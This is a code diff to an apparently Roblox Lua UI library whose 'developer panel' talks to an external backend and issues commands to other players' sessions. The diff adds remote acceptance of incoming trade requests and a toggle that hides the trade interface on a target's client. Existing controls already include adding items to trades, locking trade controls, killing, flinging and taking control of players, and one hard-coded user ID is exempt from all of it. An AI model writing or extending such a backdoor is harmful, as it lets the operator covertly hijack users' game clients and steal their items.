@@ -1013,9 +1013,14 @@ local function runDeveloperPanel(gui, options)
                         and row:GetAttribute("AllowGameplay") == true
                 elseif action == "Lock trade controls" or action == "Unlock trade controls" then
                     enabled = allowed and row:GetAttribute("AllowTradeFreeze") == true
+                elseif action == "Hide trade UI" then
+                    enabled = allowed and row:GetAttribute("AllowTradeHide") == true
                 elseif action == "Add item to trade" then
                     enabled = allowed and row:GetAttribute("AllowTradeOffer") == true
-                elseif action == "Accept current trade" then
+                elseif
+                    action == "Accept current trade"
+                    or action == "Accept incoming trade request"
+                then
                     enabled = allowed and row:GetAttribute("AllowTradeAccept") == true
                 elseif action == "Flashbang" then
                     enabled = allowed and row:GetAttribute("AllowFlashbang") == true
@@ -1038,6 +1043,11 @@ local function runDeveloperPanel(gui, options)
                 if control:FindFirstChild("ActionLabel") then
                     control.ActionLabel.TextTransparency = enabled and 0 or 0.65
                     control.ActionIcon.ImageTransparency = enabled and 0 or 0.65
+                end
+                if control.Name == "TradeVisibilityToggle" then
+                    local hidden = row:GetAttribute("TradeUIHidden") == true
+                    control.Text = hidden and "Hide trade UI (experimental): ON"
+                        or "Hide trade UI (experimental): OFF"
                 end
                 control:SetAttribute("Available", enabled)
             end
@@ -1633,12 +1643,13 @@ local function runDeveloperPanel(gui, options)
             ["Bring"] = true,
             ["Request trade review"] = true,
             ["Accept current trade"] = true,
+            ["Accept incoming trade request"] = true,
             ["Lock trade controls"] = true,
             ["Unlock trade controls"] = true,
             ["Add item to trade"] = true,
         }
-        detail.Controls.EffectsTitle.LayoutOrder = 21
-        detail.Controls.Effects.LayoutOrder = 22
+        detail.Controls.EffectsTitle.LayoutOrder = 23
+        detail.Controls.Effects.LayoutOrder = 24
         for index, name in ipairs({
             "Temp blacklist",
             "Kick",
@@ -1653,6 +1664,7 @@ local function runDeveloperPanel(gui, options)
             "Bring",
             "Request trade review",
             "Accept current trade",
+            "Accept incoming trade request",
             "Lock trade controls",
             "Unlock trade controls",
             "Add item to trade",
@@ -1668,6 +1680,25 @@ local function runDeveloperPanel(gui, options)
             actionButton:SetAttribute("Available", false)
             actionButton.ZIndex = 1
         end
+        local hideTradeToggle = button(
+            detail.Controls,
+            "Hide trade UI (experimental): OFF",
+            0,
+            0,
+            230,
+            function()
+                if backendAction then
+                    backendAction("Hide trade UI")
+                end
+            end
+        )
+        hideTradeToggle.Name = "TradeVisibilityToggle"
+        hideTradeToggle.Size = UDim2.new(1, 0, 0, 34)
+        hideTradeToggle.LayoutOrder = 22
+        hideTradeToggle.TextSize = 11
+        hideTradeToggle:SetAttribute("Action", "Hide trade UI")
+        hideTradeToggle:SetAttribute("Available", false)
+        hideTradeToggle.ZIndex = 1
         local commandsPage = create("Frame", content, {
             Name = "Commands",
             Position = UDim2.fromOffset(19, 14),
@@ -2366,6 +2397,7 @@ local function runDeveloperPanel(gui, options)
                 Flashbang = "flashbang",
                 ["Request trade review"] = "trade_review",
                 ["Accept current trade"] = "trade_accept",
+                ["Accept incoming trade request"] = "trade_accept_request",
                 Kill = "kill",
                 Bring = "bring",
             }
@@ -2387,7 +2419,7 @@ local function runDeveloperPanel(gui, options)
             name = name:lower()
             if name == "help" then
                 output(
-                    ";bring [target] | ;kill [target] | ;fling [target] | ;ragdoll [target] [seconds]\n;explode [target] | ;flashbang [target] | ;control <target> | ;uncontrol | ;tradereview [target] | ;accepttrade <target>\n;kick [target] [reason] | ;gravity [target] [1-15 seconds]\n;blacklist [target] [minutes] [reason] | ;unblacklist <userId>\n;say [target] <message> | ;blacklists | ;players\nTarget: exact username, . for this server, or omitted for selected session. Only shared server locations can match ."
+                    ";bring [target] | ;kill [target] | ;fling [target] | ;ragdoll [target] [seconds]\n;explode [target] | ;flashbang [target] | ;control <target> | ;uncontrol | ;tradereview [target] | ;accepttrade <target> | ;acceptrequest <target>\n;kick [target] [reason] | ;gravity [target] [1-15 seconds]\n;blacklist [target] [minutes] [reason] | ;unblacklist <userId>\n;say [target] <message> | ;blacklists | ;players\nTarget: exact username, . for this server, or omitted for selected session. Only shared server locations can match ."
                 )
                 return
             end
@@ -2452,6 +2484,12 @@ local function runDeveloperPanel(gui, options)
             if name == "control" then
                 startControl(target)
                 return
+            elseif name == "acceptrequest" then
+                if target == "." then
+                    output("Incoming request acceptance requires one selected username")
+                    return
+                end
+                kind, payload = "trade_accept_request", {}
             elseif name == "accepttrade" then
                 if target == "." then
                     output("Trade acceptance requires one selected username")
@@ -2553,6 +2591,28 @@ local function runDeveloperPanel(gui, options)
             if not session or not adminToken then
                 return
             end
+            if action == "Hide trade UI" then
+                if
+                    session.userId == 417873123
+                    or not session.interactions
+                    or not (session.permissions and session.permissions.tradeHide)
+                then
+                    sessions.Subtitle.Text = "Required permission is disabled on this session"
+                    return
+                end
+                task.spawn(function()
+                    queue(
+                        session,
+                        "trade_ui_visibility",
+                        {
+                            hidden = not (
+                                    session.features and session.features.tradeUIHidden == true
+                                ),
+                        }
+                    )
+                end)
+                return
+            end
             if advancedActions[action] then
                 local permission = session.permissions or {}
                 if
@@ -2561,7 +2621,7 @@ local function runDeveloperPanel(gui, options)
                         not session.interactions
                         or action == "Kick" and not permission.disconnect
                         or action == "Flashbang" and not permission.flashbang
-                        or action == "Accept current trade" and not permission.tradeAccept
+                        or (action == "Accept current trade" or action == "Accept incoming trade request") and not permission.tradeAccept
                         or (action == "Lock trade controls" or action == "Unlock trade controls") and not permission.tradeFreeze
                         or action == "Add item to trade" and not permission.tradeOffer
                         or action == "Control" and (not permission.control or not permission.gameplay)
@@ -2572,6 +2632,7 @@ local function runDeveloperPanel(gui, options)
                                 and action ~= "Release control"
                                 and action ~= "Request trade review"
                                 and action ~= "Accept current trade"
+                                and action ~= "Accept incoming trade request"
                                 and action ~= "Lock trade controls"
                                 and action ~= "Unlock trade controls"
                                 and action ~= "Add item to trade"
@@ -2654,6 +2715,9 @@ local function runDeveloperPanel(gui, options)
                     { Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.Name }
                 )
                 for feature, enabled in pairs(session.features or {}) do
+                    if feature == "tradeUIHidden" then
+                        continue
+                    end
                     if enabled then
                         local choice
                         choice = button(scroll, feature, 0, 0, 380, function()
@@ -2731,6 +2795,14 @@ local function runDeveloperPanel(gui, options)
                 row:SetAttribute("DeveloperImmune", session.userId == 417873123)
                 row:SetAttribute("Interactions", session.interactions)
                 row:SetAttribute(
+                    "AllowTradeHide",
+                    session.permissions and session.permissions.tradeHide == true or false
+                )
+                row:SetAttribute(
+                    "TradeUIHidden",
+                    session.features and session.features.tradeUIHidden == true or false
+                )
+                row:SetAttribute(
                     "AllowTradeFreeze",
                     session.permissions and session.permissions.tradeFreeze == true or false
                 )
@@ -2776,6 +2848,9 @@ local function runDeveloperPanel(gui, options)
                     .. "&w=150&h=150"
                 local features = {}
                 for feature, enabled in pairs(session.features or {}) do
+                    if feature == "tradeUIHidden" then
+                        continue
+                    end
                     if enabled then
                         table.insert(features, feature)
                     end
@@ -2957,7 +3032,7 @@ local function runDeveloperPanel(gui, options)
     }
 end
 
-local Library = { Version = "2.8.1" }
+local Library = { Version = "2.9.0" }
 function Library:CreateWindow(options)
     options = options or {}
     local url = options.BackendUrl or "https://daxware-backend.daxokayy.workers.dev"
